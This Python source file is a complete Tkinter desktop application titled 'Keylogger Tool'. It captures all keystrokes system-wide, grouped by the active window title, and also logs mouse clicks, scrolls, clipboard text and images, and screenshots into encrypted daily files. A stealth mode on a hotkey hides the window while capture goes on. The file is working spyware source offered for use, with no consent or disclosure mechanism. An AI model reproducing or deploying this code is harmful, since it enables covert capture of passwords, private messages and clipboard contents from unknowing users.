import tkinter as tk
from tkinter import filedialog, ttk, messagebox, scrolledtext
from pynput import keyboard, mouse
import os
import time
import threading
import datetime
from PIL import ImageGrab
from cryptography.fernet import Fernet
import pygame
import sys
import subprocess
import re
import pyperclip
import hashlib

THEMES = [
    {
        "name": "Light",
        "bg": "#f5f6fa", "fg": "#222831", "accent": "#2b61e0", "panel": "#e4eaff",
        "button_bg": "#e6e8ee", "button_fg": "#2b2d42", "entry_bg": "#fff", "entry_fg": "#242831",
        "section_bg": "#fafeff", "border": "#dbeafe", "icon": "🔓"
    },
    {
        "name": "Dark",
        "bg": "#1d1f21", "fg": "#c5c8c6", "accent": "#50fa7b", "panel": "#282a36",
        "button_bg": "#282a36", "button_fg": "#f8f8f2", "entry_bg": "#282a36", "entry_fg": "#f8f8f2",
        "section_bg": "#232831", "border": "#44475a", "icon": "🌑"
    },
    {
        "name": "Matrix",
        "bg": "#0d0208", "fg": "#00ff41", "accent": "#00ff41", "panel": "#1a2a1a",
        "button_bg": "#18391b", "button_fg": "#00ff41", "entry_bg": "#18391b", "entry_fg": "#00ff41",
        "section_bg": "#112811", "border": "#00ff41", "icon": "💾"
    },
    {
        "name": "Terminal",
        "bg": "#232323", "fg": "#39ff14", "accent": "#39ff14", "panel": "#101010",
        "button_bg": "#222", "button_fg": "#39ff14", "entry_bg": "#222", "entry_fg": "#39ff14",
        "section_bg": "#181818", "border": "#39ff14", "icon": "🖥"
    },
    {
        "name": "Night Owl",
        "bg": "#011627", "fg": "#82aaff", "accent": "#c792ea", "panel": "#011221",
        "button_bg": "#1d3b53", "button_fg": "#82aaff", "entry_bg": "#12263a", "entry_fg": "#82aaff",
        "section_bg": "#011221", "border": "#c792ea", "icon": "🦉"
    },
    {
        "name": "Hacker",
        "bg": "#0f111a", "fg": "#39ff14", "accent": "#fcee09", "panel": "#212733",
        "button_bg": "#263238", "button_fg": "#39ff14", "entry_bg": "#191d25", "entry_fg": "#fcee09",
        "section_bg": "#212733", "border": "#39ff14", "icon": "👾"
    },
    {
        "name": "Nord",
        "bg": "#2e3440", "fg": "#8fbcbb", "accent": "#88c0d0", "panel": "#3b4252",
        "button_bg": "#4c566a", "button_fg": "#8fbcbb", "entry_bg": "#434c5e", "entry_fg": "#d8dee9",
        "section_bg": "#3b4252", "border": "#88c0d0", "icon": "❄️"
    }
]

LOG_FONTS = ["Hack Nerd Font", "Fira Mono", "JetBrains Mono", "Matrix", "Courier New", "monospace"]
HEADING_FONTS = ["Hack Nerd Font", "Orbitron", "Montserrat", "Segoe UI", "Arial", "sans-serif"]

def get_best_font(candidates, fallback):
    try:
        from tkinter import font as tkfont
        fams = tkfont.families()
        for f in candidates:
            if f in fams:
                return f
    except Exception:
        pass
    return fallback

def get_active_window_title():
    try:
        if sys.platform == "win32":
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            win_text = win32gui.GetWindowText(hwnd)
            return win_text if win_text else "Unknown"
        elif sys.platform == "darwin":
            from AppKit import NSWorkspace
            active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            return active_app.localizedName()
        else:
            try:
                root = subprocess.check_output(['xprop', '-root', '_NET_ACTIVE_WINDOW'])
                window_id = root.decode().strip().split()[-1]
                window_name = subprocess.check_output(['xprop', '-id', window_id, 'WM_NAME'])
                return window_name.decode().split('"', 1)[1].rsplit('"', 1)[0]
            except Exception:
                return "Unknown"
    except Exception:
        return "Unknown"

def ai_interpret_sentence(sentence):
    s = sentence.strip()
    if not s: return ""
    if re.match(r"^(import |def |class |for |while |if |from )", s):
        return f'You wrote code: "{s}"'
    if re.search(r"\.py|\.txt|\.docx|\.csv|\.json", s) and ("save" in s.lower() or "ctrl+s" in s.lower()):
        return f'You saved or edited a file: "{s}"'
    if "?" in s:
        return f'You asked/searched: "{s}"'
    if "http" in s or "www." in s:
        return f'You visited a website: "{s}"'
    if re.match(r"^(cd |ls |dir |pip |python |git )", s):
        return f'You executed a command: "{s}"'
    letters = sum(1 for c in s if c.isalpha())
    if letters > len(s) / 2:
        return f'You wrote: "{s}"'
    return f'Activity: "{s}"'

def ai_summarize_by_app(app_log_dict):
    lines = []
    for app, items in app_log_dict.items():
        if not items: continue
        lines.append(f"\n[{app}]")
        for t, s in items:
            summary = ai_interpret_sentence(s)
            if summary:
                lines.append(f"- {summary} ({t})")
    return "\n".join(lines)

class SentenceLogger:
    def __init__(self, base_folder):
        self.sentence = []
        self.base_folder = base_folder
        self.day_folder = None
        self.ensure_day_folder()
        self.app_sentences = {}
    def ensure_day_folder(self):
        self.day_folder = os.path.join(self.base_folder, datetime.datetime.now().strftime("%Y-%m-%d"))
        os.makedirs(self.day_folder, exist_ok=True)
    def get_app_logfile(self, appname):
        safe = ''.join(c for c in appname if c.isalnum() or c in (' ', '_', '-')).strip().replace(" ", "_")
        return os.path.join(self.day_folder, f"{safe or 'UnknownApp'}.txt")
    def store_keystroke(self, key, app, timestamp=None):
        if timestamp is None:
            timestamp = datetime.datetime.now()
        if key in ("[SHIFT]", "[CTRL_L]", "[CTRL_R]", "[ALT]", "[ALT_R]", "[CMD]", "[CMD_R]", "[TAB]"):
            return
        if key in ["[ENTER]", "[SPACE]", ".", "!", "?"]:
            if self.sentence and not (self.sentence[-1] == " " and key == "[SPACE]"):
                self.sentence.append(" " if key == "[SPACE]" else key)
                self.save_sentence(app, timestamp)
        elif key == "[BACKSPACE]":
            if self.sentence: self.sentence.pop()
        else:
            self.sentence.append(key)
    def save_sentence(self, app, timestamp):
        if not self.sentence: return
        self.ensure_day_folder()
        filename = self.get_app_logfile(app)
        sentence_str = ''.join(self.sentence).replace("[SPACE]", " ").replace("[ENTER]", "\n").strip()
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp.strftime('%H:%M:%S')}] {sentence_str}\n")
        if app not in self.app_sentences:
            self.app_sentences[app] = []
        self.app_sentences[app].append((timestamp.strftime('%H:%M'), sentence_str))
        self.sentence = []
    def log_scroll(self, direction, app, timestamp=None):
        if timestamp is None: timestamp = datetime.datetime.now()
        filename = self.get_app_logfile(app)
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp.strftime('%H:%M:%S')}] [SCROLL_{direction}]\n")
        if app not in self.app_sentences:
            self.app_sentences[app] = []
        self.app_sentences[app].append((timestamp.strftime('%H:%M'), f"[SCROLL_{direction}]"))
    def write_summaries(self):
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        sumfile = os.path.join(self.day_folder, f"summary_{date}.txt")
        summary = "Summary for the day:\n"
        summary += ai_summarize_by_app(self.app_sentences)
        with open(sumfile, "w", encoding="utf-8") as f:
            f.write(summary)

class AdvancedKeylogger:
    def __init__(self, root):
        self.root = root
        self.theme_idx = 4
        self.theme = THEMES[self.theme_idx]
        self.is_logging = False
        self.is_paused = False
        self.is_stealth = False
        self.log_thread = None
        self.keys = []
        self.log_folder = "keylogs"
        self.screenshot_folder = "screenshots"
        self.encryption_key = None
        self.cipher = None
        self.hotkeys = {"stealth": "f12", "pause": "f11"}
        self.log_interval = 30
        self.sentence_logger = SentenceLogger(self.log_folder)
        pygame.mixer.init()
        self.setup_folders()
        self.setup_encryption()
        self.setup_gui()
        self.apply_theme()
        self.hotkey_listener = None
        self.mouse_listener = None
        self.last_clipboard = None
        self.last_clipboard_imghash = None
        self.start_hotkey_listener()

    def apply_theme(self):
        th = self.theme
        log_font = get_best_font(LOG_FONTS, "Courier New")
        heading_font = get_best_font(HEADING_FONTS, "Arial")
        self.root.configure(bg=th["bg"])
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TFrame", background=th["bg"])
        style.configure("Section.TFrame", background=th["panel"])
        style.configure("TLabel", background=th["bg"], foreground=th["fg"], font=(heading_font, 10))
        style.configure("Accent.TLabel", background=th["bg"], foreground=th["accent"], font=(heading_font, 13, "bold"))
        style.configure("TButton", background=th["button_bg"], foreground=th["button_fg"], font=(heading_font, 10, "bold"))
        style.map("TButton", background=[("active", th["accent"])])
        style.configure("TCheckbutton", background=th["panel"], foreground=th["fg"], font=(heading_font, 10))
        style.configure("TEntry", fieldbackground=th["entry_bg"], foreground=th["entry_fg"], font=(heading_font, 10))
        style.configure("TLabelframe", background=th["panel"], foreground=th["fg"])
        style.configure("TLabelframe.Label", background=th["panel"], foreground=th["accent"], font=(heading_font, 12, "bold"))
        self.preview_text.configure(bg=th["entry_bg"], fg=th["entry_fg"], insertbackground=th["accent"], font=(log_font, 12), relief=tk.GROOVE, borderwidth=2)
        self.status_label.configure(background=th["bg"], foreground=th["accent"])
        self.title_label.configure(background=th["bg"], foreground=th["accent"], font=(heading_font, 20, "bold"))
        for btn in self.all_buttons:
            btn.configure(bg=th["button_bg"], fg=th["button_fg"], activebackground=th["accent"], activeforeground=th["button_fg"], relief=tk.RAISED, bd=1, font=(heading_font, 11, "bold"))
        for entry in self.all_entries:
            entry.configure(bg=th["entry_bg"], fg=th["entry_fg"], insertbackground=th["accent"], relief=tk.GROOVE, borderwidth=2)
        for frame in self.section_frames:
            if isinstance(frame, (ttk.Frame, ttk.LabelFrame)):
                frame.configure(style="Section.TFrame")
            else:
                frame.configure(bg=th["panel"])
        self.settings_frame.configure(bg=th["panel"])
        for widget in self.settings_frame.winfo_children():
            if isinstance(widget, (tk.Label, tk.Checkbutton, tk.Entry, tk.Button)):
                widget.configure(bg=th["panel"], fg=th["fg"])
        self.root.update_idletasks()

    def toggle_theme(self):
        self.theme_idx = (self.theme_idx + 1) % len(THEMES)
        self.theme = THEMES[self.theme_idx]
        self.theme_var.set(self.theme["name"])
        self.apply_theme()
        self.status_label.configure(text=f"Theme: {self.theme['name']}")

    def theme_menu_callback(self, value):
        idx = next((i for i, t in enumerate(THEMES) if t["name"] == value), 0)
        self.theme_idx = idx
        self.theme = THEMES[self.theme_idx]
        self.apply_theme()

    def setup_gui(self):
        log_font = get_best_font(LOG_FONTS, "Courier New")
        heading_font = get_best_font(HEADING_FONTS, "Arial")
        thicon = self.theme["icon"]
        self.title_label = tk.Label(self.root, text=f"{thicon} Keylogger Tool", font=(heading_font, 20, "bold"))
        self.title_label.pack(pady=10)
        self.main_frame = ttk.Frame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10)
        self.section_frames = []
        self.all_buttons = []
        self.all_entries = []
        self.section_frames.append(self.main_frame)
        topbar = ttk.Frame(self.main_frame)
        topbar.pack(pady=0, fill=tk.X)
        self.section_frames.append(topbar)
        self.fullscreen_button = tk.Button(topbar, text="⛶", command=self.toggle_fullscreen, width=3)
        self.fullscreen_button.pack(side=tk.LEFT, padx=2)
        tk.Label(topbar, text="Full Screen", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
        self.minimize_button = tk.Button(topbar, text="🗕", command=self.minimize, width=3)
        self.minimize_button.pack(side=tk.LEFT, padx=2)
        tk.Label(topbar, text="Minimize", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
        self.halfscreen_button = tk.Button(topbar, text="▭", command=self.toggle_halfscreen, width=3)
        self.halfscreen_button.pack(side=tk.LEFT, padx=2)
        tk.Label(topbar, text="Half Screen", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
        self.open_folder_button = tk.Button(topbar, text="📂", command=self.open_log_folder, width=3)
        self.open_folder_button.pack(side=tk.LEFT, padx=2)
        tk.Label(topbar, text="Open Log Folder", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
        self.theme_var = tk.StringVar(value=THEMES[self.theme_idx]["name"])
        theme_names = [t["name"] for t in THEMES]
        self.theme_menu = ttk.OptionMenu(topbar, self.theme_var, THEMES[self.theme_idx]["name"], *theme_names, command=self.theme_menu_callback)
        self.theme_menu.pack(side=tk.LEFT, padx=6)
        tk.Label(topbar, text="Theme", fg="#82aaff", bg="#011627").pack(side=tk.LEFT)
        self.all_buttons += [self.fullscreen_button, self.minimize_button, self.halfscreen_button, self.open_folder_button]
        control_frame = ttk.Frame(self.main_frame)
        control_frame.pack(pady=10, fill=tk.X)
        self.section_frames.append(control_frame)
        self.start_button = tk.Button(control_frame, text="▶", command=lambda: self.dispatch("start"), width=3)
        self.start_button.pack(side=tk.LEFT, padx=3)
        tk.Label(control_frame, text="Start", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
        self.stop_button = tk.Button(control_frame, text="■", command=lambda: self.dispatch("stop"), state="disabled", width=3)
        self.stop_button.pack(side=tk.LEFT, padx=3)
        tk.Label(control_frame, text="Stop", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
        self.pause_button = tk.Button(control_frame, text="⏸", command=lambda: self.dispatch("pause"), state="disabled", width=3)
        self.pause_button.pack(side=tk.LEFT, padx=3)
        tk.Label(control_frame, text="Pause", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
        self.stealth_button = tk.Button(control_frame, text="🕵️", command=lambda: self.dispatch("stealth"), width=3)
        self.stealth_button.pack(side=tk.LEFT, padx=3)
        tk.Label(control_frame, text="Stealth", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
        self.screenshot_btn = tk.Button(control_frame, text="📸", command=lambda: self.dispatch("screenshot"), width=3)
        self.screenshot_btn.pack(side=tk.LEFT, padx=3)
        tk.Label(control_frame, text="Screenshot", fg="#82aaff", bg="#011221").pack(side=tk.LEFT)
        self.all_buttons += [self.start_button, self.stop_button, self.pause_button, self.stealth_button, self.screenshot_btn]
        preview_frame = ttk.Frame(self.main_frame)
        preview_frame.pack(pady=3, padx=2, fill=tk.BOTH, expand=True)
        self.section_frames.append(preview_frame)
        preview_label = ttk.Label(preview_frame, text="Log Preview:", style="Accent.TLabel")
        preview_label.pack(anchor="w")
        preview_container = tk.Frame(preview_frame)
        preview_container.pack(fill=tk.BOTH, expand=True)
        self.preview_text = scrolledtext.ScrolledText(preview_container, height=16, width=120, state="disabled", font=(log_font, 12), wrap=tk.WORD)
        self.preview_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.preview_scroll = tk.Scrollbar(preview_container, command=self.preview_text.yview)
        self.preview_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.preview_text.config(yscrollcommand=self.preview_scroll.set)
        self.preview_text.insert(tk.END, "No logs yet. Start logging to see activity here.")
        self.preview_text.bind("<MouseWheel>", lambda e: self.preview_text.yview_scroll(-1*(e.delta//120), "units"))
        self.preview_text.bind("<Button-4>", lambda e: self.preview_text.yview_scroll(-1, "units"))
        self.preview_text.bind("<Button-5>", lambda e: self.preview_text.yview_scroll(+1, "units"))
        search_frame = ttk.Frame(self.main_frame)
        search_frame.pack(pady=5, padx=2, fill=tk.X)
        self.section_frames.append(search_frame)
        search_label = ttk.Label(search_frame, text="Search Logs:")
        search_label.pack(side=tk.LEFT, padx=2)
        self.search_entry = tk.Entry(search_frame, width=53)
        self.all_entries.append(self.search_entry)
        self.search_entry.pack(side=tk.LEFT, padx=4)
        self.search_button = tk.Button(search_frame, text="🔍", command=lambda: self.dispatch("search"))
        self.search_button.pack(side=tk.LEFT, padx=4)
        self.all_buttons.append(self.search_button)
        self.settings_frame = tk.Frame(self.main_frame, bd=2, relief=tk.RIDGE, bg=self.theme['panel'])
        self.settings_frame.pack(pady=10, padx=10, fill=tk.X, ipadx=8, ipady=8)
        self.section_frames.append(self.settings_frame)
        general_label = tk.Label(self.settings_frame, text="General Settings", font=(heading_font, 13, "bold"), bg=self.theme['panel'], fg=self.theme['accent'])
        general_label.grid(row=0, column=0, sticky="w", padx=2, pady=3, columnspan=3)
        folder_label = tk.Label(self.settings_frame, text="Log Folder:", bg=self.theme['panel'], fg=self.theme['fg'])
        folder_label.grid(row=1, column=0, sticky="w", padx=2)
        self.folder_entry = tk.Entry(self.settings_frame, width=35)
        self.folder_entry.insert(0, self.log_folder)
        self.folder_entry.grid(row=1, column=1, padx=2)
        self.all_entries.append(self.folder_entry)
        self.folder_button = tk.Button(self.settings_frame, text="📁", command=lambda: self.dispatch("browse"), width=3)
        self.folder_button.grid(row=1, column=2, padx=2)
        self.all_buttons.append(self.folder_button)
        adv_label = tk.Label(self.settings_frame, text="Advanced", font=(heading_font, 13, "bold"), bg=self.theme['panel'], fg=self.theme['accent'])
        adv_label.grid(row=2, column=0, sticky="w", padx=2, pady=(10,3), columnspan=3)
        log_interval_label = tk.Label(self.settings_frame, text="Log Interval (sec):", bg=self.theme['panel'], fg=self.theme['fg'])
        log_interval_label.grid(row=3, column=0, sticky="w", padx=2)
        self.log_interval_entry = tk.Entry(self.settings_frame, width=8)
        self.log_interval_entry.insert(0, "30")
        self.all_entries.append(self.log_interval_entry)
        self.log_interval_entry.grid(row=3, column=1, sticky="w", padx=2)
        hotkey_label = tk.Label(self.settings_frame, text="Hotkeys (e.g., f12):", bg=self.theme['panel'], fg=self.theme['fg'])
        hotkey_label.grid(row=4, column=0, sticky="w", padx=2)
        self.stealth_hotkey_entry = tk.Entry(self.settings_frame, width=8)
        self.stealth_hotkey_entry.insert(0, self.hotkeys["stealth"])
        self.all_entries.append(self.stealth_hotkey_entry)
        self.stealth_hotkey_entry.grid(row=4, column=1, sticky="w", padx=2)
        self.pause_hotkey_entry = tk.Entry(self.settings_frame, width=8)
        self.pause_hotkey_entry.insert(0, self.hotkeys["pause"])
        self.all_entries.append(self.pause_hotkey_entry)
        self.pause_hotkey_entry.grid(row=4, column=2, sticky="w", padx=2)
        self.save_settings_button = tk.Button(self.settings_frame, text="💾", command=lambda: self.dispatch("save_settings"), width=3)
        self.save_settings_button.grid(row=5, column=0, pady=8)
        self.all_buttons.append(self.save_settings_button)
        self.status_label = tk.Label(self.root, text="Status: Idle", anchor="w", font=(heading_font, 11))
        self.status_label.pack(side=tk.BOTTOM, fill=tk.X, pady=3)

    def dispatch(self, action):
        if action == "start": self.start_logging()
        elif action == "stop": self.stop_logging()
        elif action == "pause": self.pause_logging()
        elif action == "stealth": self.toggle_stealth()
        elif action == "search": self.search_logs()
        elif action == "browse": self.browse_folder()
        elif action == "save_settings": self.save_settings()
        elif action == "screenshot": self.take_screenshot()

    def setup_folders(self):
        os.makedirs(self.log_folder, exist_ok=True)
        os.makedirs(self.screenshot_folder, exist_ok=True)

    def setup_encryption(self):
        key_file = "encryption_key.key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                self.encryption_key = f.read()
        else:
            self.encryption_key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(self.encryption_key)
        self.cipher = Fernet(self.encryption_key)

    def browse_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            self.folder_entry.delete(0, tk.END)
            self.folder_entry.insert(0, folder)
            self.log_folder = folder
            self.sentence_logger.base_folder = folder
            os.makedirs(self.log_folder, exist_ok=True)

    def open_log_folder(self):
        folder = os.path.abspath(self.log_folder)
        if sys.platform == "win32":
            os.startfile(folder)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", folder])
        else:
            subprocess.Popen(["xdg-open", folder])

    def save_settings(self):
        self.log_folder = self.folder_entry.get() or "keylogs"
        os.makedirs(self.log_folder, exist_ok=True)
        self.sentence_logger.base_folder = self.log_folder
        try:
            self.log_interval = int(self.log_interval_entry.get())
        except ValueError:
            self.log_interval = 30
        self.hotkeys["stealth"] = self.stealth_hotkey_entry.get() or "f12"
        self.hotkeys["pause"] = self.pause_hotkey_entry.get() or "f11"
        self.restart_hotkey_listener()
        messagebox.showinfo("Success", "Settings saved.")

    def toggle_fullscreen(self):
        is_fs = self.root.attributes("-fullscreen")
        self.root.attributes("-fullscreen", not is_fs)
        self.fullscreen_button.configure(text="⛶" if is_fs else "🗗")

    def minimize(self):
        self.root.iconify()

    def toggle_halfscreen(self):
        scr_w = self.root.winfo_screenwidth()
        scr_h = self.root.winfo_screenheight()
        width, height = scr_w // 2, scr_h // 2
        self.root.geometry(f"{width}x{height}")

    def start_hotkey_listener(self):
        def on_hotkey(key):
            try:
                key_str = str(key).replace("Key.", "").lower()
                if key_str == self.hotkeys["stealth"]:
                    self.toggle_stealth()
                elif key_str == self.hotkeys["pause"]:
                    self.pause_logging()
            except Exception:
                pass
        self.hotkey_listener = keyboard.Listener(on_press=on_hotkey)
        self.hotkey_listener.start()

    def restart_hotkey_listener(self):
        if self.hotkey_listener:
            self.hotkey_listener.stop()
        self.start_hotkey_listener()

    def start_logging(self):
        if self.is_logging:
            return
        self.is_logging = True
        self.is_paused = False
        self.start_button.configure(state=tk.DISABLED)
        self.stop_button.configure(state=tk.NORMAL)
        self.pause_button.configure(state=tk.NORMAL)
        self.status_label.configure(text="Status: Logging started...")
        self.log_thread = threading.Thread(target=self.log_keys, daemon=True)
        self.log_thread.start()
        self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
        self.mouse_listener.start()
        threading.Thread(target=self.auto_save_logs, daemon=True).start()
        threading.Thread(target=self.clipboard_logger, daemon=True).start()

    def stop_logging(self):
        self.is_logging = False
        self.is_paused = False
        self.start_button.configure(state=tk.NORMAL)
        self.stop_button.configure(state=tk.DISABLED)
        self.pause_button.configure(state=tk.DISABLED)
        self.status_label.configure(text="Status: Logging stopped.")
        self.sentence_logger.write_summaries()
        self.save_log()
        self.keys = []
        if self.mouse_listener:
            self.mouse_listener.stop()

    def pause_logging(self):
        if self.is_logging and not self.is_paused:
            self.is_paused = True
            self.pause_button.configure(text="▶")
            self.status_label.configure(text="Status: Logging paused.")
        elif self.is_logging and self.is_paused:
            self.is_paused = False
            self.pause_button.configure(text="⏸")
            self.status_label.configure(text="Status: Logging resumed.")

    def toggle_stealth(self):
        self.is_stealth = not self.is_stealth
        if self.is_stealth:
            self.root.withdraw()
            self.stealth_button.configure(text="❌")
            self.status_label.configure(text="Status: Stealth mode enabled.")
        else:
            self.root.deiconify()
            self.stealth_button.configure(text="🕵️")
            self.status_label.configure(text="Status: Stealth mode disabled.")

    def log_keys(self):
        def on_press(key):
            if not self.is_logging or self.is_paused:
                return
            try:
                timestamp = datetime.datetime.now()
                app = get_active_window_title()
                key_str = self.process_key(key)
                self.sentence_logger.store_keystroke(key_str, app, timestamp)
                if key_str not in ["[SHIFT]", "[CTRL_L]", "[CTRL_R]", "[ALT]", "[ALT_R]", "[CMD]", "[CMD_R]"]:
                    preview_entry = f"[{timestamp.strftime('%H:%M:%S')}] [{app}] {key_str}"
                    self.keys.append(preview_entry)
                    self.update_preview(preview_entry)
            except Exception as e:
                self.keys.append(f"Error: {str(e)}")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def on_mouse_click(self, x, y, button, pressed):
        if not self.is_logging or self.is_paused or not pressed:
            return
        timestamp = datetime.datetime.now()
        app = get_active_window_title()
        button_str = "Left" if button == mouse.Button.left else "Right"
        log_entry = f"[{timestamp.strftime('%H:%M:%S')}] [{app}] [MOUSE_{button_str}]"
        self.keys.append(log_entry)
        self.update_preview(log_entry)
        self.sentence_logger.store_keystroke(f"[MOUSE_{button_str}]", app, timestamp)

    def on_mouse_scroll(self, x, y, dx, dy):
        if not self.is_logging or self.is_paused:
            return
        timestamp = datetime.datetime.now()
        app = get_active_window_title()
        direction = "UP" if dy > 0 else "DOWN"
        self.sentence_logger.log_scroll(direction, app, timestamp)
        log_entry = f"[{timestamp.strftime('%H:%M:%S')}] [{app}] [SCROLL_{direction}]"
        self.keys.append(log_entry)
        self.update_preview(log_entry)

    def process_key(self, key):
        try:
            if hasattr(key, "char") and key.char:
                return key.char
            else:
                key_str = str(key).replace("Key.", "").upper()
                if key_str == "SPACE":
                    return "[SPACE]"
                elif key_str == "ENTER":
                    return "[ENTER]"
                elif key_str == "BACKSPACE":
                    return "[BACKSPACE]"
                elif key_str == "TAB":
                    return "[TAB]"
                elif key_str in ["CTRL_L", "CTRL_R"]:
                    return f"[{key_str}]"
                elif key_str in ["SHIFT", "SHIFT_R", "ALT", "ALT_R", "CMD", "CMD_R"]:
                    return f"[{key_str}]"
                return f"[{key_str}]"
        except Exception:
            return None

    def update_preview(self, log_entry):
        log_font = get_best_font(LOG_FONTS, "Courier New")
        self.preview_text.configure(state="normal")
        self.preview_text.delete(1.0, tk.END)
        if not self.keys:
            self.preview_text.insert(tk.END, "No logs yet. Start logging to see activity here.")
        else:
            for entry in self.keys[-20:]:
                try:
                    if "] [" in entry:
                        time_part, rest = entry.split("] [", 1)
                        app_part, key_part = rest.split("] ", 1)
                        self.preview_text.insert(tk.END, f"{time_part}] [", ("date",))
                        self.preview_text.insert(tk.END, f"{app_part}]", ("app",))
                        self.preview_text.insert(tk.END, f" {key_part.strip()}\n", ("key",))
                    else:
                        self.preview_text.insert(tk.END, entry + "\n", ("key",))
                except Exception:
                    self.preview_text.insert(tk.END, entry + "\n", ("key",))
        self.preview_text.tag_configure("date", font=(log_font, 9), foreground="#4b8484")
        self.preview_text.tag_configure("app", font=(log_font, 10, "bold"), foreground=self.theme["accent"])
        self.preview_text.tag_configure("key", font=(log_font, 12), foreground=self.theme["fg"])
        self.preview_text.see(tk.END)
        self.preview_text.configure(state="disabled")

    def save_log(self):
        if not self.keys:
            return
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        log_file = os.path.join(self.log_folder, date, f"summary_log_{date}.txt")
        log_content = "\n".join(self.keys)
        encrypted_content = self.cipher.encrypt(log_content.encode())
        with open(log_file, "wb") as f:
            f.write(encrypted_content)
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        self.keys.append(f"[{time_str}]  [LOG SAVED] [SAVED]")
        self.update_preview(self.keys[-1])

    def auto_save_logs(self):
        while self.is_logging:
            self.save_log()
            try:
                self.log_interval = int(self.log_interval_entry.get())
            except ValueError:
                self.log_interval = 30
            time.sleep(self.log_interval)

    def take_screenshot(self):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(self.screenshot_folder, f"screenshot_{timestamp}.png"))
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log_entry = f"[{time_str}]  [SCREENSHOT] [SAVED]"
        self.keys.append(log_entry)
        self.update_preview(log_entry)

    def clipboard_logger(self):
        while self.is_logging:
            try:
                ct = pyperclip.paste()
                if ct != self.last_clipboard and isinstance(ct, str) and ct.strip():
                    self.last_clipboard = ct
                    self.save_clipboard_text(ct)
            except Exception:
                pass
            try:
                img = ImageGrab.grabclipboard()
                if img is not None:
                    img_hash = hashlib.md5(img.tobytes()).hexdigest()
                    if img_hash != self.last_clipboard_imghash:
                        self.last_clipboard_imghash = img_hash
                        self.save_clipboard_image(img)
            except Exception:
                pass
            time.sleep(1)

    def save_clipboard_text(self, txt):
        folder = os.path.join(self.log_folder, datetime.datetime.now().strftime("%Y-%m-%d"), "clipboard")
        os.makedirs(folder, exist_ok=True)
        fname = os.path.join(folder, f"clipboard_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
        with open(fname, "w", encoding="utf-8") as f:
            f.write(txt)

    def save_clipboard_image(self, img):
        folder = os.path.join(self.log_folder, datetime.datetime.now().strftime("%Y-%m-%d"), "clipboard")
        os.makedirs(folder, exist_ok=True)
        fname = os.path.join(folder, f"clipboard_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
        img.save(fname)

    def search_logs(self):
        query = self.search_entry.get().lower()
        if not query:
            messagebox.showinfo("Info", "Please enter a search query.")
            return
        self.preview_text.configure(state="normal")
        self.preview_text.delete(1.0, tk.END)
        found = False
        for log in self.keys:
            if query in log.lower():
                self.preview_text.insert(tk.END, f"{log}\n")
                found = True
        if not found:
            self.preview_text.insert(tk.END, "No matches found.\n")
        self.preview_text.configure(state="disabled")

def main():
    root = tk.Tk()
    app = AdvancedKeylogger(root)
    root.mainloop()

if __name__ == "__main__":
    main()